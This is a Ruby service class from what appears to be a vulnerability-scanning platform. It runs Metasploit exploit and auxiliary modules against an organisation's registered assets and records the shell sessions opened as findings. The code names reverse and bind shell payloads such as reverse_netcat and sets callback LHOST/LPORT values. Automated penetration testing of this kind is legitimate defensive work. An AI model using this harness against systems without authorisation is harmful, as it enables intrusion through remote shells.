require 'json'
require 'socket'
require 'open3'
require 'tempfile'
require 'timeout'
require 'thread'
require 'set'
require 'shellwords'
require 'pty'
require 'fileutils'
require 'securerandom'
require 'msfrpc-client'

class ScanService
  def self.msf_base          = Aegis.config.msf.modules_path
  def self.msf_auxiliary_base = Aegis.config.msf.auxiliary_path
  MSF_BASE           = msf_base
  MSF_AUXILIARY_BASE = msf_auxiliary_base

  puts "[ScanService] MSF_BASE=#{MSF_BASE} MSF_AUXILIARY_BASE=#{MSF_AUXILIARY_BASE}"

  def initialize(org_id, filter_params, user_id, scan = nil, asset_ids = [], scan_options = {})
    @org_id        = org_id
    @filter_params = (filter_params || {}).transform_keys(&:to_s)
    @user_id       = user_id
    @scan          = scan
    @asset_ids     = Array(asset_ids).map(&:to_i).select { |id| id > 0 }
    @scan_options  = scan_options || {}
  end

  def perform
    puts "Starting Scan for Org #{@org_id}..."
    targets = get_targets(@org_id)
    results = []
    threads = []
    mutex = Mutex.new

    targets.each do |target|
      target_ip    = target['ip']
      target_ports = target['ports']
      asset_id     = target['asset_id']

      threads << Thread.new do
        begin
          scan_target_id  = create_scan_target(asset_id)
          target_findings = 0
          target_exploits = 0

          if connect_network(target_ip, target['proxy']) == 1
            target_os  = target['os']
            modules    = get_modules_for_target(target_os)
            sev_filter = @filter_params['severities']

            # Safe mode: open one shared MSF console for all modules on this target
            # so we avoid the overhead of create/destroy per module
            if @scan_options[:safe_mode]
              aux_client = rpc_client
              if aux_client
                con = aux_client.call('console.create') rescue nil
                if con
                  Thread.current[:msf_aux_console] = con['id'].to_s
                  puts "[SafeMode] Shared console #{Thread.current[:msf_aux_console]} opened for #{target_ip}"
                end
              end
            end

            succeeded_exploit_ids = Set.new

            effective_ports = if @scan_options[:port_override].present?
              parsed = parse_ports(@scan_options[:port_override])
              puts "Port override for #{target_ip}: #{parsed.join(', ')}"
              parsed
            else
              target_ports
            end

            effective_ports.each do |port|
              modules.each do |mod|
                severity = read_module_rank(mod[:file])
                next if sev_filter.present? && !sev_filter.include?(severity)

                exploit_record = get_or_create_exploit_record(mod[:path], mod[:file])
                next if succeeded_exploit_ids.include?(exploit_record.id)

                exploit_hash = {
                  'id'                => exploit_record.id,
                  'name'              => exploit_record.name,
                  'metasploit_module' => mod[:path],
                  'severity'          => severity,
                  'default_payload'   => exploit_record.default_payload
                }

                start_ms = (Time.now.to_f * 1000).to_i
                result   = attack(exploit_hash, target_ip, port, target['proxy'])
                elapsed  = (Time.now.to_f * 1000).to_i - start_ms

                target_exploits += 1
                exploit_result = if @scan_options[:safe_mode]
                  result[:success] ? 'detected' : 'not_detected'
                else
                  result[:success] ? 'success' : 'failed'
                end
                create_scan_exploit(asset_id, exploit_record.id, exploit_result, elapsed)

                if result[:success]
                  target_findings += 1
                  succeeded_exploit_ids << exploit_record.id
                  create_finding(asset_id, exploit_record.id, severity, result[:evidence], port)
                end

                mutex.synchronize do
                  entry = {
                    target:          target_ip,
                    port:            port,
                    exploit:         mod[:path],
                    exploit_name:    exploit_record.name,
                    severity:        severity,
                    success:         result[:success],
                    scan_mode:       @scan_options[:safe_mode] ? 'reconnaissance' : 'exploit',
                    timestamp:       Time.now,
                    cve_id:          exploit_record.cve_id,
                    description:     exploit_record.description,
                    disclosure_date: exploit_record.disclosure_date&.to_s,
                    references:      exploit_record.references,
                    evidence:        result[:evidence]
                  }

                  if @scan_options[:use_agent]
                    entry[:isVulnerable] = result[:success]
                    entry[:exploit_code] = (File.read(mod[:file]) rescue nil) if result[:success]
                  end

                  results << entry
                end
              end
            end

            # Destroy the shared auxiliary console now that all modules are done
            if @scan_options[:safe_mode] && Thread.current[:msf_aux_console]
              rpc_client&.call('console.destroy', Thread.current[:msf_aux_console]) rescue nil
              puts "[SafeMode] Shared console closed for #{target_ip}"
              Thread.current[:msf_aux_console] = nil
            end

            disconnect_network()
          else
            puts "Could not connect to target #{target_ip}."
          end

          complete_scan_target(scan_target_id, target_exploits, target_findings)
        rescue => e
          puts "Error scanning target #{target_ip}: #{e.message}"
          puts e.backtrace.first(6).join("\n")
        end
      end
    end

    threads.each(&:join)

    findings_count = results.count { |r| r[:success] }
    critical = results.count { |r| r[:success] && r[:severity]&.downcase == 'critical' }
    high     = results.count { |r| r[:success] && r[:severity]&.downcase == 'high' }
    medium   = results.count { |r| r[:success] && r[:severity]&.downcase == 'medium' }
    low      = results.count { |r| r[:success] && r[:severity]&.downcase == 'low' }

    @scan&.update!(
      status:                'completed',
      end_time:              Time.current,
      total_exploits_tested: results.map { |r| r[:exploit] }.uniq.size,
      findings_count:        findings_count,
      scanned_assets:        targets.size,
      critical_findings:     critical,
      high_findings:         high,
      medium_findings:       medium,
      low_findings:          low,
      safe_mode:             @scan_options[:safe_mode] || false
    )

    successful_results = @scan_options[:safe_mode] ? results : results.select { |r| r[:success] }
    report_json = result_to_json(successful_results)

    Report.create!(
      organization_id: @org_id,
      user_id:         @user_id,
      generated_by:    @user_id,
      scan_id:         @scan&.id,
      report_name:     "Scan #{Time.current.strftime('%Y-%m-%d %H:%M')}",
      report_type:     @scan_options[:use_agent] ? 'whitebox' : (@scan_options[:safe_mode] ? 'reconnaissance' : 'vulnerability'),
      report_format:   'json',
      report_data:     successful_results,
      generated_at:    Time.current
    )

    log_results_to_file(report_json, @org_id)
    cleanup_old_logs(Aegis.config.scan.log_retention_days)

    Aegis::Notifications::ScanLifecycle.completed(@scan, findings_count,
      organization_id: @org_id, user_id: @user_id)
    puts "Scan complete."
  rescue => e
    puts "Scan failed: #{e.message}"
    @scan&.update!(status: 'failed', end_time: Time.current)
    Aegis::Notifications::ScanLifecycle.failed(@scan,
      organization_id: @org_id, user_id: @user_id)
    raise
  end

  private

  def connect_network(ip, proxy = nil)
    puts "Checking connectivity to #{ip}#{proxy ? " via #{proxy}" : " (direct)"}..."
    Aegis::Network::TcpProbe.alive?(ip, proxy: proxy)
  end

  def disconnect_network
    puts "Disconnecting from network..."
    return 1
  end

  def attack(exploit, target_ip, port, proxy = nil)
    timeout_secs = (@scan_options[:timeout].presence || Aegis.config.scan.default_timeout).to_i
    client       = rpc_client

    unless client
      return attack_subprocess(exploit, target_ip, port, proxy, timeout_secs)
    end

    if @scan_options[:safe_mode]
      rpc_run_auxiliary(client, exploit, target_ip, port, proxy, timeout_secs)
    else
      rpc_run_exploit(client, exploit, target_ip, port, proxy, timeout_secs)
    end
  rescue => e
    puts "Attack error [#{exploit['metasploit_module']}]: #{e.message}"
    { success: false, evidence: nil }
  end

  def rpc_config
    msf = Aegis.config.msf
    { host: msf.rpc_host, port: msf.rpc_port, ssl: msf.rpc_ssl, uri: '/api/' }
  end

  def local_network?(ip)
    require 'ipaddr'
    addr = IPAddr.new(ip)
    [IPAddr.new('10.0.0.0/8'), IPAddr.new('172.16.0.0/12'),
     IPAddr.new('192.168.0.0/16'), IPAddr.new('100.64.0.0/10')].any? { |r| r.include?(addr) }
  rescue
    false
  end

  def outbound_ip_for(target_ip, cid: nil)
    explicit = Aegis.config.msf.lhost
    return explicit if explicit.present?

    detected = UDPSocket.open { |s| s.connect(target_ip, 1); s.addr.last } rescue nil

    # Inside Docker, UDPSocket returns the container's IP (172.x / 10.x), which
    # is not a host interface and unreachable by scan targets. Ask msfrpcd —
    # running on the host — to do the same routing lookup from the host's side.
    if detected.nil? || (ENV['RUNNING_IN_DOCKER'] == '1' && detected =~ /\A(172\.|10\.)/)
      @lhost_cache ||= {}
      @lhost_cache[target_ip] ||= detect_lhost_via_msfrpc(target_ip, cid: cid)
      return @lhost_cache[target_ip] if @lhost_cache[target_ip].present?
      return nil if ENV['RUNNING_IN_DOCKER'] == '1'  # container IP is unreachable by targets
    end

    detected || '127.0.0.1'
  end

  def detect_lhost_via_msfrpc(target_ip, cid: nil)
    client = rpc_client
    return nil unless client

    # Prefer a caller-supplied console (already initialised) to avoid paying
    # the MSF banner/init cost (~10-20s) on a fresh console every call.
    own_cid = nil
    unless cid
      con = client.call('console.create') rescue nil
      return nil unless con
      own_cid = con['id'].to_s
      cid = own_cid
    end

    safe_ip = Shellwords.escape(target_ip)
    cmd = "ruby require 'socket'; puts UDPSocket.open { |s| s.connect('#{safe_ip}', 1); s.addr.last }\n"
    client.call('console.write', cid, cmd)
    output = ''
    15.times do
      sleep 1
      chunk = (client.call('console.read', cid) rescue {})['data'].to_s
      output += chunk
      break if output.match?(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/)
    end
    client.call('console.destroy', own_cid) rescue nil if own_cid

    ip = output.scan(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/).flatten
              .reject { |a| a == '127.0.0.1' }.first
    puts "[LHOST] msfrpcd on host reports #{ip.inspect} as outbound IP for #{target_ip}"
    ip
  rescue => e
    puts "[LHOST] msfrpcd detection failed: #{e.message}"
    nil
  end

  def rpc_client
    return Thread.current[:msf_rpc] if Thread.current[:msf_rpc]
    # Don't retry a connection that already failed in this thread — each attempt
    # costs a full TCP timeout before returning nil.
    return nil if Thread.current[:msf_rpc_unavailable]
    pass = Aegis.config.msf.rpc_pass
    unless pass
      Thread.current[:msf_rpc_unavailable] = true
      puts "WARNING: MSF_RPC_PASS not set — falling back to msfconsole subprocess (slow)"
      return nil
    end
    client = Msf::RPC::Client.new(rpc_config)
    # Hard cap on login. msfrpc-client has no built-in read timeout, so a sick
    # msfrpcd would otherwise stall the worker for ~60s before falling back.
    Timeout.timeout(10) { client.login(Aegis.config.msf.rpc_user, pass) }
    Thread.current[:msf_rpc] = client
  rescue => e
    Thread.current[:msf_rpc_unavailable] = true
    puts "msfrpcd connection failed: #{e.message} — falling back to msfconsole subprocess (slow)"
    nil
  end

  def select_payload(client, mod_name, use_bind)
    res      = client.call('module.compatible_payloads', mod_name)
    payloads = res['payloads'] || []
    return nil if payloads.empty?

    if use_bind
      prefs  = %w[cmd/unix/bind_netcat cmd/unix/bind_perl cmd/unix/bind_ruby linux/x86/shell_bind_tcp]
      chosen = prefs.find { |p| payloads.include?(p) }
      chosen || payloads.find { |p| p.include?('bind') } || payloads.first
    else
      prefs  = %w[cmd/unix/interact cmd/unix/reverse_netcat cmd/unix/reverse_perl
                  linux/x86/shell_reverse_tcp linux/x86/shell/reverse_tcp]
      chosen = prefs.find { |p| payloads.include?(p) }
      chosen || payloads.find { |p| p.include?('reverse') } || payloads.first
    end
  rescue => e
    puts "compatible_payloads failed for #{mod_name}: #{e.message}"
    nil
  end

  def rpc_run_exploit(client, exploit, target_ip, port, proxy, timeout_secs)
    mod_name = exploit['metasploit_module'].sub(/\Aexploit\//, '')
    use_bind = proxy.present? || !local_network?(target_ip)
    payload  = exploit['default_payload'].presence || select_payload(client, mod_name, use_bind)

    unless payload
      puts "No compatible payload for #{mod_name}, skipping"
      return { success: false, evidence: nil }
    end

    opts = {
      'RHOSTS'         => target_ip,
      'PAYLOAD'        => payload,
      'LPORT'          => Aegis.config.msf.lport,
      'ConnectTimeout' => 15,
      'ExitOnSession'  => false
    }
    opts['RPORT']   = port if port
    opts['Proxies'] = proxy if proxy.present?
    # LHOST is intentionally omitted — msfrpcd runs on the host network and
    # auto-detects the correct outbound interface for each target via UDPSocket routing.

    puts "RPC module.execute: #{target_ip}:#{port} [#{mod_name}] payload=#{payload}#{proxy ? " via #{proxy}" : ""}"

    sessions_before = ((client.call('session.list') rescue nil) || {}).keys.map(&:to_s).to_set

    res    = client.call('module.execute', 'exploit', mod_name, opts)
    job_id = res['job_id']&.to_s

    success  = false
    evidence = nil
    deadline = Time.now + timeout_secs

    while Time.now < deadline
      sleep 2
      sessions_now = (client.call('session.list') rescue {})
      new_sessions = sessions_now.reject { |id, _| sessions_before.include?(id.to_s) }
      if new_sessions.any?
        sid, sinfo = new_sessions.first
        evidence = "Session #{sid} opened: #{sinfo['tunnel_local']} -> #{sinfo['tunnel_peer']} (#{sinfo['type']})"
        success  = true
        client.call('session.stop', sid.to_s) rescue nil
        break
      end
    end

    client.call('job.stop', job_id) rescue nil if job_id

    dump_msf_debug(exploit, target_ip, port, nil, evidence.to_s, evidence.to_s, success, []) if Aegis.config.msf.debug
    puts success ? "[+] #{mod_name} session opened on #{target_ip}" : "[-] #{mod_name} — no session on #{target_ip}"
    { success: success, evidence: evidence }
  rescue Msf::RPC::ServerException => e
    puts "RPC ServerException [#{mod_name}]: #{e.message}"
    { success: false, evidence: nil }
  end

  def rpc_run_auxiliary(client, exploit, target_ip, port, proxy, timeout_secs)
    mod_name   = exploit['metasploit_module'].sub(/\Aauxiliary\//, '')
    shared_cid = Thread.current[:msf_aux_console]
    own_cid    = nil

    unless shared_cid
      con     = client.call('console.create')
      own_cid = con['id'].to_s
    end

    cid = shared_cid || own_cid

    begin
      # Drain any leftover output from previous modules on the shared console so
      # we only look at output produced by THIS module's run.
      begin
        2.times { client.call('console.read', cid) rescue nil }
      end

      cmds = [
        "use auxiliary/#{mod_name}",
        "set RHOSTS #{target_ip}",
        (port ? "set RPORT #{port}" : nil),
        (proxy ? "set Proxies #{proxy}" : nil),
        "run"
      ].compact.join("\n") + "\n"

      client.call('console.write', cid, cmds)
      sleep 3  # give MSF time to start the module before first read

      deadline         = Time.now + timeout_secs
      output           = ''
      consecutive_idle = 0
      completion_re    = /Auxiliary module execution completed|Exploit completed|Post module execution completed/i

      while Time.now < deadline
        sleep 2
        res     = client.call('console.read', cid) rescue {}
        chunk   = res['data'].to_s
        output += chunk
        # Primary completion signal: msfconsole's own "execution completed" line.
        # (The old `echo ===AEGIS_DONE===` sentinel was broken — msfconsole echoes
        # every command BEFORE running it, so the marker appeared in the buffer
        # almost immediately and we exited before `run` produced any output.)
        break if output.match?(completion_re)
        # Fallback: require 3 consecutive idle reads AND a minimum elapsed
        # window, so we don't exit during the brief gap before msfconsole
        # starts executing the module.
        if res['busy']
          consecutive_idle = 0
        else
          consecutive_idle += 1
          break if consecutive_idle >= 3
        end
      end

      parsed = Aegis::Msf::OutputParser.parse_safe_mode(output, target_ip)
      dump_msf_debug(exploit, target_ip, port, nil, output, output, parsed[:success], parsed[:meaningful_ip_lines]) if Aegis.config.msf.debug
      puts parsed[:success] ? "[+] #{mod_name} detected on #{target_ip}" : "[-] #{mod_name} — nothing detected on #{target_ip}"
      { success: parsed[:success], evidence: parsed[:evidence] }
    ensure
      client.call('console.destroy', own_cid) rescue nil if own_cid
    end
  rescue Msf::RPC::ServerException => e
    puts "RPC ServerException [#{mod_name}]: #{e.message}"
    Thread.current[:msf_aux_console] = nil if shared_cid  # console may be dead; clear so next module creates fresh
    { success: false, evidence: nil }
  end

  # Fallback used when msfrpcd is unavailable (MSF_RPC_PASS not set or connection refused).
  MSF_CONSOLE = Aegis.config.msf.console_path

  # Uses PTY.spawn so msfconsole sees a terminal and outputs [+] / [*] lines in full.
  def attack_subprocess(exploit, target_ip, port, proxy, timeout_secs)
    rc_file = Tempfile.new(['aegis_', '.rc'])
    output  = ''
    pid     = nil

    begin
      rc_file.write(build_resource_file(exploit, target_ip, port, proxy))
      rc_file.flush

      puts "Launching msfconsole for #{target_ip}:#{port} [#{exploit['name']}]#{proxy ? " via #{proxy}" : " (direct)"}"

      # msfconsole must run OUTSIDE the Rails app's Bundler context — otherwise it
      # inherits BUNDLE_GEMFILE/RUBYOPT/GEM_HOME from the Rails parent and tries to
      # resolve itself against this app's Gemfile, which fails instantly (no run).
      master, slave, pid = with_clean_bundler_env do
        PTY.spawn(MSF_CONSOLE, '-q', '--no-readline', '-r', rc_file.path)
      end
      slave.close rescue nil  # parent doesn't need the slave end

      begin
        Timeout.timeout(timeout_secs + 10) do
          begin
            loop { output += master.readpartial(4096) }
          rescue Errno::EIO, EOFError
            # PTY slave closed — process finished
          end
        end
      rescue Timeout::Error
        Process.kill('TERM', pid) rescue nil
      ensure
        Process.wait(pid) rescue nil
        master.close rescue nil
      end

      # Strip ANSI colour codes produced by msfconsole in TTY mode
      clean = output.gsub(/\e\[[\d;]*[A-Za-z]/, '').gsub(/\r\n?/, "\n")

      parsed = if @scan_options[:safe_mode]
        Aegis::Msf::OutputParser.parse_safe_mode(clean, target_ip)
      else
        Aegis::Msf::OutputParser.parse_exploit_mode(clean).merge(meaningful_ip_lines: [])
      end
      dump_msf_debug(exploit, target_ip, port, rc_file.path, output, clean, parsed[:success], parsed[:meaningful_ip_lines]) if Aegis.config.msf.debug
      { success: parsed[:success], evidence: parsed[:evidence] || (parsed[:success] ? 'Detected' : nil) }
    rescue => e
      puts "Attack failed: #{e.message}"
      { success: false, evidence: nil }
    ensure
      rc_file.close! rescue nil
    end
  end

  def with_clean_bundler_env
    if defined?(Bundler)
      Bundler.with_unbundled_env { yield }
    else
      saved = {}
      %w[BUNDLE_GEMFILE BUNDLE_BIN_PATH BUNDLER_SETUP BUNDLER_VERSION
         BUNDLER_ORIG_BUNDLER_VERSION RUBYOPT RUBYLIB GEM_HOME GEM_PATH GEM_ROOT].each do |k|
        saved[k] = ENV.delete(k)
      end
      begin
        yield
      ensure
        saved.each { |k, v| ENV[k] = v if v }
      end
    end
  end

  def dump_msf_debug(exploit, target_ip, port, rc_path, raw, clean, success, meaningful_ip_lines)
    dir = Rails.root.join('logs', 'msf_debug')
    FileUtils.mkdir_p(dir)
    slug = exploit['metasploit_module'].to_s.gsub(/[^A-Za-z0-9]+/, '_')[0, 80]
    path = dir.join("scan_#{@scan&.id}_#{target_ip.gsub('.', '_')}_#{slug}_#{Time.now.to_i}_#{SecureRandom.hex(3)}.log")
    rc_contents = rc_path ? (File.read(rc_path) rescue '(unavailable)') : '(rpc path — no rc file)'
    File.write(path, <<~LOG)
      === AEGIS MSF DEBUG DUMP ===
      scan_id:    #{@scan&.id}
      module:     #{exploit['metasploit_module']}
      name:       #{exploit['name']}
      target:     #{target_ip}:#{port || '(default)'}
      safe_mode:  #{@scan_options[:safe_mode]}
      success:    #{success}
      meaningful_ip_lines: #{meaningful_ip_lines.size}
      timestamp:  #{Time.now.iso8601}

      === RC FILE ===
      #{rc_contents}
      === RAW PTY OUTPUT (with ANSI) ===
      #{raw}
      === CLEANED OUTPUT ===
      #{clean}
      === END ===
    LOG
    puts "[msf_debug] wrote #{path}"
  rescue => e
    puts "[msf_debug] failed: #{e.message}"
  end

  def build_resource_file(exploit, target_ip, port, proxy)
    @scan_options[:safe_mode] ? build_auxiliary_rc(exploit, target_ip, port, proxy)
                              : build_exploit_rc(exploit, target_ip, port, proxy)
  end

  def build_exploit_rc(exploit, target_ip, port, proxy)
    lhost   = outbound_ip_for(target_ip)
    lport   = Aegis.config.msf.lport
    payload = exploit['default_payload'].presence

    lines = [
      "use #{exploit['metasploit_module']}",
      "set RHOSTS #{target_ip}",
      (port ? "set RPORT #{port}" : nil),
      (payload ? "set PAYLOAD #{payload}" : nil),
      "set LHOST #{lhost}",
      "set LPORT #{lport}",
      "set ConnectTimeout 15",
      (proxy ? "set Proxies #{proxy}" : nil),
      "run -z",
      "sleep 15",
      "exit -y"
    ].compact
    lines.join("\n") + "\n"
  end

  def build_auxiliary_rc(exploit, target_ip, port, proxy)
    lines = [
      "use #{exploit['metasploit_module']}",
      "set RHOSTS #{target_ip}",
      (port ? "set RPORT #{port}" : nil),
      (proxy ? "set Proxies #{proxy}" : nil),
      "run",
      "sleep 3",
      "exit -y"
    ].compact
    lines.join("\n") + "\n"
  end

  def create_scan_target(asset_id)
    return nil unless @scan&.id && asset_id
    result = ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.scan_targets (scan_id, asset_id, target_status, started_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, 'scanning', NOW()) " \
      "ON CONFLICT (scan_id, asset_id) DO UPDATE SET target_status = 'scanning', started_at = NOW() " \
      "RETURNING id"
    )
    result.first&.fetch('id', nil)
  rescue => e
    puts "Error creating scan_target: #{e.message}"
    nil
  end

  def complete_scan_target(scan_target_id, exploits_tested, findings_count)
    return unless scan_target_id
    ActiveRecord::Base.connection.execute(
      "UPDATE vuln_scanner.scan_targets " \
      "SET target_status = 'completed', completed_at = NOW(), " \
      "exploits_tested = #{exploits_tested.to_i}, findings_count = #{findings_count.to_i} " \
      "WHERE id = #{scan_target_id.to_i}"
    )
  rescue => e
    puts "Error completing scan_target: #{e.message}"
  end

  def create_scan_exploit(asset_id, exploit_id, result, elapsed_ms)
    return unless @scan&.id && asset_id && exploit_id
    safe_result = %w[success failed detected not_detected].include?(result) ? result : 'failed'
    ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.scan_exploits (scan_id, asset_id, exploit_id, result, execution_time_ms, tested_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, #{exploit_id.to_i}, '#{safe_result}', #{elapsed_ms.to_i}, NOW())"
    )
  rescue => e
    puts "Error creating scan_exploit: #{e.message}"
  end

  def create_finding(asset_id, exploit_id, severity, evidence, port = nil)
    return unless @scan&.id && asset_id && exploit_id
    safe_severity = %w[critical high medium low].include?(severity&.downcase) ? severity.downcase : 'medium'
    safe_evidence = ActiveRecord::Base.connection.quote(evidence.to_s)
    port_sql      = port ? port.to_i : 'NULL'
    ActiveRecord::Base.connection.execute(
      "INSERT INTO vuln_scanner.findings (scan_id, asset_id, exploit_id, severity, status, evidence, port, discovered_at) " \
      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, #{exploit_id.to_i}, '#{safe_severity}', 'open', #{safe_evidence}, #{port_sql}, NOW())"
    )
  rescue => e
    puts "Error creating finding: #{e.message}"
  end

  def result_to_json(results_raw)
    JSON.generate(results_raw)
  rescue JSON::GeneratorError => e
    puts "JSON Generation Error: #{e.message}"
  end

  def log_results_to_file(results_json, org_id)
    log_dir = Rails.root.join("logs")
    FileUtils.mkdir_p(log_dir)

    filename = "#{log_dir}/scan_results_org_#{org_id}_#{Time.now.strftime('%Y%m%d_%H%M%S')}.json"
    File.write(filename, results_json)
    puts "Results logged to #{filename}"
  rescue => e
    puts "Failed to log results to file: #{e.message}"
  end

  def cleanup_old_logs(days = 7)
    log_dir = Rails.root.join("logs")
    return unless Dir.exist?(log_dir)

    puts "Cleaning up logs older than #{days} days..."
    cutoff_time = Time.now - (days * 24 * 60 * 60)

    Dir.glob("#{log_dir}/*.json").each do |file|
      begin
        if File.mtime(file) < cutoff_time
          File.delete(file)
          puts "Deleted old log: #{file}"
        end
      rescue => e
        puts "Failed to delete #{file}: #{e.message}"
      end
    end
  end

  def get_modules_for_target(target_os)
    allowlist = @filter_params['module_allowlist']

    if @scan_options[:safe_mode]
      base   = MSF_AUXILIARY_BASE
      prefix = 'auxiliary/'
      dirs   = auxiliary_scanner_dirs(target_os)
    else
      base   = MSF_BASE
      prefix = 'exploit/'
      dirs   = platform_dirs(target_os)
    end

    files = dirs.any? ? dirs.flat_map { |d| Dir.glob("#{base}/#{d}/**/*.rb") }
                      : Dir.glob("#{base}/**/*.rb")

    # If the targeted subdirs produced nothing, fall back to the full tree
    if files.empty? && dirs.any?
      puts "[#{@scan_options[:safe_mode] ? 'SafeMode' : 'Scan'}] Subdirs #{dirs.inspect} empty under #{base}, falling back to full tree"
      files = Dir.glob("#{base}/**/*.rb")
    end

    if @scan_options[:safe_mode]
      puts "[SafeMode] Auxiliary base: #{base} | dirs: #{dirs.inspect} | modules found: #{files.size}"
    end

    mods = files.uniq.map { |f| { path: prefix + f.sub("#{base}/", '').sub('.rb', ''), file: f } }
    allowlist.present? ? mods.select { |m| allowlist.include?(m[:path]) } : mods
  end

  def platform_dirs(platform)          = Aegis::Msf::PlatformDirs.for_exploits(platform)
  def auxiliary_scanner_dirs(platform) = Aegis::Msf::PlatformDirs.for_auxiliary_scanners(platform)

  def read_module_rank(file_path)
    Aegis::MsfModuleParser.severity_from_file(file_path)
  end

  def get_or_create_exploit_record(module_path, file_path)
    exploit = Exploit.find_or_initialize_by(exploit_id: module_path)
    if exploit.new_record? || exploit.description.blank?
      meta = parse_module_metadata(file_path)
      exploit.name             = meta[:name].presence ||
                                 module_path.split('/').last.tr('_', ' ').split.map(&:capitalize).join(' ')
      exploit.description      = meta[:description]
      exploit.cve_id           = meta[:cve_id]
      exploit.disclosure_date  = meta[:disclosure_date]
      exploit.references       = meta[:references]
      exploit.authors          = meta[:authors]
      exploit.severity         = read_module_rank(file_path)
      exploit.metasploit_module = module_path
      exploit.save!
    end
    exploit
  rescue ActiveRecord::RecordNotUnique
    Exploit.find_by!(exploit_id: module_path)
  end

  def parse_module_metadata(file_path)
    Aegis::MsfModuleParser.metadata_full(file_path)
  end

  def get_targets(org_id)
    condition = @asset_ids.any? ? "AND id IN (#{@asset_ids.map(&:to_i).join(',')})" : ""
    result = ActiveRecord::Base.connection.select_all(
      "SELECT id, ip_address, scan_config FROM vuln_scanner.assets WHERE organization_id = #{org_id.to_i} AND is_active = true #{condition}"
    )
    targets = []
    result.each do |row|
      config = JSON.parse(row['scan_config'] || '{}') rescue {}
      ports  = parse_ports(config['port'])
      ip     = row['ip_address'].to_s
      proxy = if @scan_options[:use_agent] == false
        nil
      else
        agent = Agent.find_for_target(org_id, ip)
        agent ? "socks5:127.0.0.1:#{agent.tunnel_port}" : nil
      end
      puts proxy ? "Routing #{ip} via agent proxy #{proxy}" : "Scanning #{ip} directly (no agent)"
      targets << { 'ip' => ip, 'asset_id' => row['id'].to_i, 'ports' => ports, 'proxy' => proxy, 'os' => config['os'] }
    end
    targets
  rescue => e
    puts "Error fetching targets: #{e.message}"
    []
  end

  def parse_ports(port_str)
    return [nil] if port_str.blank?  # nil → each module uses its own default RPORT

    str = port_str.to_s.strip

    # Range: "8000-8080" — pick one random port in range
    if str =~ /\A(\d+)-(\d+)\z/
      lo, hi = $1.to_i, $2.to_i
      return [rand(lo..hi)] if lo >= 1 && hi <= 65535 && lo <= hi
    end

    # Comma-separated or single: "22, 80, 443" — return all valid ports
    ports = str.split(',').map { |p| p.strip.to_i }.select { |p| p >= 1 && p <= 65535 }
    ports.any? ? ports : [rand(1..65535)]
  end

  def parse_port(port_str) = parse_ports(port_str).first
end
